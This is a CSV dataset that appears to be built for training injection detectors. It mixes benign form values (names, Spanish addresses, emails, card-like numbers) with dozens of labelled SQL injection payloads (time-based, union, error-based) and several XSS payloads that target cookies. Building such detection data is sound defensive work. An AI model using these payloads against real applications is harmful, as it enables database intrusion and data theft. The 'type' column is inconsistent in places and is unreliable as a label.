Text,attack_type,Label,type
49449729m,norm,0,normal
vernn,norm,0,normal
funston8,norm,0,normal
2un4141ali46r,norm,0,normal
ban_quera,norm,0,normal
48083550a,norm,0,normal
isunza,norm,0,normal
"c/ jardins de caterina albert 149,",norm,0,normal
"-9087"" order by 1#",sqli,1,normal
"1%"")) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",sqli,1,sql
"c/ 57 15, 9g",norm,0,normal
"1"" where 1618=1618 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#",sqli,1,normal
maurie,norm,0,normal
ru5runears2,norm,0,normal
1') where 9817=9817;begin user_lock.sleep(5); end--,sqli,1,sql
19275,norm,0,normal
nictalopa,norm,0,normal
"1""));waitfor delay '0:0:5' and ((""ykgm""=""ykgm",sqli,1,sql
adgardo,norm,0,normal
free,norm,0,normal
"1'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('tfnb'='tfnb",sqli,1,sql
conried6@misanimalesdomesticos.ky,norm,0,normal
edlene,norm,0,normal
l0s4njear,norm,0,normal
66091214r,norm,0,normal
3071574299603363,norm,0,normal
-7246'||(select 'qchp' from dual where 8317=8317 order by 1--,sqli,1,sql
"1"" union all select null,null,null,null,null,null--",sqli,1,sql
"1') where 4500=4500;iif(5257=5257,1,1/0)",sqli,1,sql
trespalacios latorre,norm,0,normal
"1"" where 2452=2452;select sleep(5)#",sqli,1,sql
"1))) union all select null,null,null#",sqli,1,sql
"-5064) as mzxc where 1889=1889 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
3454478326370479,norm,0,normal
4162370064639312,norm,0,normal
"1))) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1"" where 2462=2462 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
-3861') as zmja where 4036=4036 or 9323=9323#,sqli,1,normal
b3r3al,norm,0,normal
"1' where 6953=6953 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
jauyau,norm,0,normal
"1""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""adwg"" like ""adwg",sqli,1,sql
"1')) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
potts,norm,0,normal
gillingwater_jordal@lettere.gr,norm,0,normal
strock,norm,0,normal
angs,norm,0,normal
9783618046984809,norm,0,normal
maira,norm,0,normal
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",sqli,1,sql
"1'||(select 'kzkr' from dual where 2778=2778;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'",sqli,1,sql
2564,norm,0,normal
solonitsin3@neotelecom.fi,norm,0,normal
22859316f,norm,0,normal
1%') or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
23657,norm,0,normal
prize@lingote.com.pn,norm,0,normal
"1%') union all select null,null,null,null,null--",sqli,1,sql
1')) as pdcl where 6964=6964;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
3-e1e5rur3,norm,0,normal
"1""));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((""eevk""=""eevk",sqli,1,sql
bermdez delvalle,norm,0,normal
1' where 1770=1770;select (case when (5569=9390) then 5569 else 1/(select 0) end)--,sqli,1,sql
1') as wquy where 2518=2518;select sleep(5)#,sqli,1,sql
36726019x,norm,0,normal
5728310223960582,norm,0,normal
9227,norm,0,normal
46198,norm,0,normal
"1"" and 9468=7105--",sqli,1,sql
1'))) waitfor delay '0:0:5' and ((('clcf'='clcf,sqli,1,normal
"1 where 4787=4787;iif(1483=7301,1,1/0)",sqli,1,sql
"calle silvestre peromarta 60,",norm,0,normal
"calle abeto, 187,",norm,0,normal
8886172589266335,norm,0,normal
wenzel,norm,0,normal
"1"")) union all select null,null,null,null,null,null,null#",sqli,1,sql
c/ asuncion 115 5e,norm,0,normal
tornielli heusser,norm,0,normal
cortada mercader,norm,0,normal
"1"";select count(*) from generate_series(1,5000000) and ""ihbe"" like ""ihbe",sqli,1,sql
"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
42141,norm,0,normal
antypas sardans,norm,0,normal
30731993z,norm,0,normal
"1"")) as hzcq where 9250=9250 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,1,sql
lo7ange,norm,0,normal
29142280s,norm,0,normal
62397798v,norm,0,normal
<script>document.cookie=true;//<</script>,xss,2,xss
"1"") and elt(1210=1210,sleep(5)) and (""cwwv"" like ""cwwv",sqli,1,normal
3065165787609619,norm,0,normal
"1"" union all select null,null,null#",sqli,1,sql
82521750g,norm,0,normal
a2b66r5z,norm,0,normal
"1"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ""psbz""=""psbz",sqli,1,sql
08571,norm,0,normal
8032,norm,0,normal
"1"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""vwep"" like ""vwep",sqli,1,sql
avenida letanias 195 2?d,norm,0,normal
"1%')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('%'='",sqli,1,sql
di112i5a98n3e,norm,0,normal
woll@stockdefotos.bb,norm,0,normal
poyer,norm,0,normal
-3598) union all select 2264#,sqli,1,sql
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('ekqv'='ekqv",sqli,1,normal
76663718a,norm,0,normal
inclemente,norm,0,normal
3245452183569196,norm,0,normal
c406l2n5,norm,0,normal
"1'))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
6034871098442134,norm,0,normal
"c/ animas, 101,",norm,0,normal
descrieres@enibiza.com.ac,norm,0,normal
6196716655513010,norm,0,normal
"1%"" or elt(5873=5873,sleep(5))#",sqli,1,normal
antonio juez 67 3?a,norm,0,normal
1)) as tnhy where 1874=1874 and 2858=7324#,sqli,1,normal
"1') as ohnu where 4097=4097 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
celadas,norm,0,normal
08691,norm,0,normal
pelarrodrguez,norm,0,normal
"-4286%""))) union all select 2229,2229,2229,2229,2229,2229#",sqli,1,sql
15686,norm,0,normal
"1"") or elt(5873=5873,sleep(5))#",sqli,1,normal
25769,norm,0,normal
"calle la rambla de el saler, 25",norm,0,normal
"-2783' where 1494=1494 union all select 1494,1494,1494,1494,1494,1494--",sqli,1,sql
0891192306237140,norm,0,normal
1%')) and 7533=7533 and (('%'=',sqli,1,normal
"calle antigua calle de la mar, 31, 7?d",norm,0,normal
33600,norm,0,normal
49si90q00m87a,norm,0,normal
6a0ato,norm,0,normal
-9841 where 4612=4612 union all select 4612--,sqli,1,sql
boyadgian@campanasextractoras.tv,norm,0,normal
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""buwe""=""buwe",sqli,1,sql
"-4056""))) union all select 4363,4363,4363,4363,4363,4363,4363,4363#",sqli,1,sql
riodeva,norm,0,normal
"1) where 5550=5550 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1,sql
8489461843085797,norm,0,normal
6453670410602968,norm,0,normal
batalla mier,norm,0,normal
"1%"")) union all select null,null,null,null,null,null,null,null#",sqli,1,sql
levitin,norm,0,normal
"1%"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""%""=""",sqli,1,sql
1'))) order by 1--,sqli,1,sql
1)) as oqui where 3368=3368 order by 1--,sqli,1,sql
clysdale8,norm,0,normal
5128322398230292,norm,0,normal
"plaza alberto corral 68, 9f",norm,0,normal
9805,norm,0,normal
salina-sonajew@almeriastella.vg,norm,0,normal
pager@cocheacoche.ws,norm,0,normal
"1)) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((9333=9333",sqli,1,sql
motte@clubdecampo.com.gw,norm,0,normal
"1' where 2160=2160 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
"-9988%"" or elt(1032=1032,3623) and ""%""=""",sqli,1,normal
"1"")) as ubrg where 7318=7318 and 7331=6529--",sqli,1,sql
"-4960 union all select 4031,4031#",sqli,1,sql
lihun,norm,0,normal
"calle perez galdos 193,",norm,0,normal
"1""))) union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
7730856749924883,norm,0,normal
mulleras picornel,norm,0,normal
1) as vxsh where 4706=4706;if(6624=4232) select 6624 else drop function xyyt--,sqli,1,sql
1';select sleep(5) and 'beuk'='beuk,sqli,1,sql
1) as rlft where 1670=1670 waitfor delay '0:0:5'--,sqli,1,sql
6ar10l30,norm,0,normal
or5ina8ia,norm,0,normal
25410,norm,0,normal
maula,norm,0,normal
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,1,sql
"-9582') where 4397=4397 union all select 4397,4397,4397#",sqli,1,sql
pizani@unanuevavisionenortodoncia.tg,norm,0,normal
nebila,norm,0,normal
mctaggart@gafa.com.io,norm,0,normal
2036710936767005,norm,0,normal
sall mico,norm,0,normal
"1%') or 8466=benchmark(5000000,md5(0x694a4745)) and ('%'='",sqli,1,normal
machar,norm,0,normal
"1"") union all select null,null,null,null,null--",sqli,1,sql
8541242880536778,norm,0,normal
"-8128"")) as ovjz where 7375=7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",sqli,1,sql
morlanes funosa,norm,0,normal
"1%';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
9302322356246829,norm,0,normal
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('uwbt' like 'uwbt,sqli,1,sql
salazar borja,norm,0,normal
1'+(select 'iyyv' where 9500=9500 or (select * from (select(sleep(5)))ydpu))+',sqli,1,sql
"1))) union all select null,null,null,null,null,null,null--",sqli,1,sql
"1"")) union all select null,null,null#",sqli,1,sql
12312,norm,0,normal
43783,norm,0,normal
alferova@tacticlinks.com.af,norm,0,normal
8860654392526309,norm,0,normal
"1') where 5925=5925 union all select null,null,null,null,null,null,null#",sqli,1,sql
2403,norm,0,normal
8a92rique46,norm,0,normal
5010003702753512,norm,0,normal
"1) where 9012=9012 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1;select sleep(5)#,sqli,1,sql
68m+b11n,norm,0,normal
madgett,norm,0,normal
"1'||(select 'npel' from dual where 5258=5258;select benchmark(5000000,md5(0x4c4d6142)))||'",sqli,1,sql
0u5o,norm,0,normal
lamarre,norm,0,normal
-6129) as vuze where 1565=1565 or (8459=8459)*4906--,sqli,1,sql
"c/ de la radio 81, 7?b",norm,0,normal
p5r0i9i5ar,norm,0,normal
"1"") as lexx where 2892=2892 or elt(6272=6272,sleep(5))--",sqli,1,sql
1) where 4548=4548 and 9198=9198--,sqli,1,sql
lourenz,norm,0,normal
severn5,norm,0,normal
66837882c,norm,0,normal
1 and 4595=4595#,sqli,1,normal
28295,norm,0,normal
"1%"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""%""=""",sqli,1,normal
ollo,norm,0,normal
"-1171' union all select 3958,3958,3958,3958,3958--",sqli,1,sql
rub de bracamonte,norm,0,normal
segura reygadas,norm,0,normal
45571518p,norm,0,normal
apo90ico,norm,0,normal
50293,norm,0,normal
"1"" or sleep(5) and ""telb""=""telb",sqli,1,normal
8466,norm,0,normal
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",sqli,1,sql
75p80ica,norm,0,normal
1) where 6116=6116 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
45757577c,norm,0,normal
1 where 3735=3735;waitfor delay '0:0:5'--,sqli,1,sql
santo,norm,0,normal
-9650') or 1390=3209,sqli,1,normal
c/ arco de veronicas s/n 4e,norm,0,normal
"1'+(select ugvj where 2593=2593 union all select null,null,null,null,null#",sqli,1,sql
6336,norm,0,normal
door,norm,0,normal
kamber@weat.gd,norm,0,normal
"1;select benchmark(5000000,md5(0x4c4d6142))-- sztf",sqli,1,sql
rigby,norm,0,normal
8ho0l2,norm,0,normal
1' in boolean mode) and 6969=(select 6969 from pg_sleep(5))#,sqli,1,sql
"1""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""asvy""=""asvy",sqli,1,sql
de6211gami5970,norm,0,normal
in08i28aci30,norm,0,normal
santa eullia de ronana,norm,0,normal
1'))) and (3020=3020)*6703 and ((('ujds'='ujds,sqli,1,normal
bisbe gonyalons 189 12?f,norm,0,normal
pizcar,norm,0,normal
van_kast,norm,0,normal
-1890'))) or 8526=1389 and ((('ecgt'='ecgt,sqli,1,normal
"1%"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""%""=""",sqli,1,normal
"1"") where 6956=6956 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
sentiu de si la,norm,0,normal
vartan,norm,0,normal
"de gaspar cassado, 134,",norm,0,normal
1) as tbve where 4828=4828;select sleep(5)#,sqli,1,sql
7378889316326396,norm,0,normal
"<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">",xss,2,xss
1))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((5368=5368,sqli,1,sql
marylin,norm,0,normal
"1)) as khvx where 7533=7533 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
alcoberro cruells,norm,0,normal
"1';call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
gardiner@enlapalma.com.tf,norm,0,normal
"<frameset><frame src=""javascript:document.cookie=true;""></frameset>",xss,2,xss
1' where 7176=7176;select pg_sleep(5)--,sqli,1,sql
"-1197"")) as dfsy where 8857=8857 or 3038=3038",sqli,1,normal
09030291p,norm,0,normal
"-7579%"" or 6570=1764",sqli,1,normal
1' in boolean mode) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)#,sqli,1,sql
5655366857246860,norm,0,normal
hy,norm,0,normal
lanfranchi@getgold.tl,norm,0,normal
deying,norm,0,normal
"1%') and elt(4249=4249,7259) and ('%'='",sqli,1,normal
"1') where 3450=3450 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1"") where 3727=3727 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"1"") or 6793=(select 6793 from pg_sleep(5)) and (""lsis"" like ""lsis",sqli,1,sql
"<link rel=""stylesheet"" href=""javascript:alert('xss');"">",xss,2,xss
"1') as qqyz where 2274=2274;iif(5257=5257,1,1/0)",sqli,1,sql
bergad faix,norm,0,normal
80igm94016,norm,0,normal
8324557940571698,norm,0,normal
lasedad,norm,0,normal
pettinge,norm,0,normal
"1"") as ssbz where 8885=8885 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
benidorm,norm,0,normal
metclafe4@cursosdele.az,norm,0,normal
desempulgadura,norm,0,normal
patchsqa,norm,0,normal
"1) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1,sql
llach mund,norm,0,normal
27415264t,norm,0,normal
"calle virgen de covadonga, 32",norm,0,normal
"josep guix i llado, 89 2-d",norm,0,normal
1)));select case when 7717=7717 then 1 else null end--,sqli,1,sql
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('%'='",sqli,1,sql
1) as pqle where 4039=4039 and 7533=7533--,sqli,1,sql
"1'+(select kpso where 1226=1226 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
"-7656""))) union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",sqli,1,sql
1);select (case when (9455=6007) then 9455 else 9455*(select 9455 from mysql.db) end)#,sqli,1,sql
13g0e7at42a,norm,0,normal
75106972n,norm,0,normal
6408,norm,0,normal
"1)));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((3044=3044",sqli,1,sql
becilla de valderaduey,norm,0,normal
1499,norm,0,normal
malapeir cavaller,norm,0,normal
75131649x,norm,0,normal
"1"" or elt(6272=6272,sleep(5)) and ""zzca""=""zzca",sqli,1,normal
"1%"";if(8995=9787) select 8995 else drop function ofgg--",sqli,1,sql
"-9937')) union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",sqli,1,sql
borracho,norm,0,normal
-4324 order by 1--,sqli,1,sql
6490017049810723,norm,0,normal
chapurrar,norm,0,normal
"-1106')) union all select 2855,2855,2855,2855,2855,2855,2855#",sqli,1,sql
"1"");begin user_lock.sleep(5); end and (""nuix"" like ""nuix",sqli,1,sql
krajacic,norm,0,normal
confrides,norm,0,normal
3720042690454906,norm,0,normal
kaefer,norm,0,normal
"1""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1) where 5048=5048 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
"1' where 3760=3760 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
-8777%'))) or (3934=2025)*2025 and ((('%'=',sqli,1,normal
valverde de los arroyos,norm,0,normal
-8357')) as henk where 8198=8198 or 2558=9103#,sqli,1,normal
"1) where 7978=7978 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"calle de las abejorreras 29, 4a",norm,0,normal
148ad5ra,norm,0,normal
"1"") where 1001=1001 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('sied'='sied",sqli,1,sql
96174245k,norm,0,normal
7301,norm,0,normal
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('uyft'='uyft",sqli,1,sql
"1"") as rgod where 5766=5766 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
elisha,norm,0,normal
shan-min,norm,0,normal
26987451x,norm,0,normal
koeman0,norm,0,normal
camio canexa 161 11?g,norm,0,normal
"1) where 8302=8302 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1,sql
velero@softwaresaas.ec,norm,0,normal
sabinigo,norm,0,normal
"1'||(select 'dyuw' from dual where 2037=2037;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1) as phja where 4627=4627;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
mlaga,norm,0,normal
31519125v,norm,0,normal
"calle pare joaquim roig s.f. s/n, 2?f",norm,0,normal
espluga de francol l',norm,0,normal
"1"" where 1719=1719 and 7533=7533--",sqli,1,sql
"1) where 9010=9010 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
rebes huasequi,norm,0,normal
63298862x,norm,0,normal
29691,norm,0,normal
<script>a=/crosssitescripting/ document.cookie=true;</script>,xss,2,xss
paesa regnet,norm,0,normal
3074022895871752,norm,0,normal
"1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('yzdp'='yzdp",sqli,1,sql
"-8144') where 1691=1691 or elt(7246=7816,7816)--",sqli,1,sql
"1"")) as krro where 1050=1050 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
"1) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (5098=5098",sqli,1,sql
s9p2212419435.5,norm,0,normal
"1'))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('sbey'='sbey",sqli,1,sql
"1"") or (select * from (select(sleep(5)))ydpu) and (""cadh"" like ""cadh",sqli,1,sql
teresa,norm,0,normal
1')) waitfor delay '0:0:5' and (('bbqk'='bbqk,sqli,1,normal
pasaje cruz de mayo 108 1?c,norm,0,normal
"-1985%'))) union all select 3051,3051,3051--",sqli,1,sql
1'+(select 'rejz' where 1530=1530 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+',sqli,1,sql
bonnin isarch,norm,0,normal
"-8651"") where 8391=8391 union all select 8391,8391#",sqli,1,sql
"-8200' in boolean mode) union all select 3360,3360--",sqli,1,sql
enamorar,norm,0,normal
41240,norm,0,normal
bruscamente,norm,0,normal
1') and 7533=7533 and ('xyga' like 'xyga,sqli,1,normal
"1"")) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((""isbh"" like ""isbh",sqli,1,normal
benedict@deltamarina.ve,norm,0,normal
30584367w,norm,0,normal
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",sqli,1,sql
"1') where 3262=3262 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
boskova_busey@piensoparaperros.qa,norm,0,normal
covachuela,norm,0,normal
1' and 1541=6868#,sqli,1,normal
veg*oso,norm,0,normal
1'+(select 'ezpy' where 5282=5282 order by 1#,sqli,1,sql
"1)) as sxhg where 7697=7697 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
4808731272531869,norm,0,normal
contraveros,norm,0,normal
c9373cto2,norm,0,normal
"1"")) as pafp where 6770=6770 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
enlutada,norm,0,normal
charlie,norm,0,normal
trbena,norm,0,normal
80483953f,norm,0,normal
"1%') and elt(3114=3114,sleep(5))#",sqli,1,normal
"1%"");select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
"1%')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('%'='",sqli,1,sql
"1"") as jngl where 8384=8384 and 4580=1718--",sqli,1,sql
colmada,norm,0,normal
"1,(select (case when (5154=5154) then 1 else 5154*(select 5154 from master..sysdatabases) end))",sqli,1,sql
90,norm,0,normal
aizpuru cerusoli,norm,0,normal
bouchard,norm,0,normal
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
peart,norm,0,normal
bronny,norm,0,normal
witting@videotubo.cl,norm,0,normal
alicante,norm,0,normal
pangui,norm,0,normal
"1') and elt(4249=4249,7259) and ('bkag'='bkag",sqli,1,normal
"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('bacm'='bacm",sqli,1,sql
"1%""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
1' in boolean mode) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))#,sqli,1,sql
58725277k,norm,0,normal
"1')) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
46814,norm,0,normal
"plaa dels bous, 107",norm,0,normal
95!6a752a,norm,0,normal
nobilsimamente,norm,0,normal
03307827j,norm,0,normal
zubans,norm,0,normal
"1 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,1,sql
garcez iturriria,norm,0,normal
gaiger,norm,0,normal
1846096870233397,norm,0,normal
farese@bloodline.as,norm,0,normal
degollar,norm,0,normal
gutman@latiendadecolchones.mn,norm,0,normal
39392,norm,0,normal
rub,norm,0,normal
salom,norm,0,normal
1')) as nsfx where 9553=9553 rlike sleep(5)--,sqli,1,sql
roel,norm,0,normal
1%' and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
"-4785""))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
-2210' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and 'myvr' like 'myvr,sqli,1,sql
celene,norm,0,normal
3141141898028856,norm,0,normal
menasce,norm,0,normal
1' where 9003=9003 waitfor delay '0:0:5'--,sqli,1,sql
1 order by 1#,sqli,1,normal
t31331,norm,0,normal
e$57ct918ena,norm,0,normal
goddette,norm,0,normal
"-4168') union all select 2618,2618#",sqli,1,sql
12199825g,norm,0,normal
"calle godelleta, s/n",norm,0,normal
gibezzi scampini,norm,0,normal
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'tqvy' like 'tqvy",sqli,1,sql
90660924f,norm,0,normal
blomgren@informex.jp,norm,0,normal
2319,norm,0,normal
1'+(select xzse where 4530=4530;(select * from (select(sleep(5)))srmq))+',sqli,1,sql
6819239674494837,norm,0,normal
bujaraloz,norm,0,normal
"1'));iif(5257=5257,1,1/0)",sqli,1,sql
solar,norm,0,normal
"1%""))) union all select null,null,null#",sqli,1,sql
"1"")));select sleep(5) and (((""wucy"" like ""wucy",sqli,1,sql
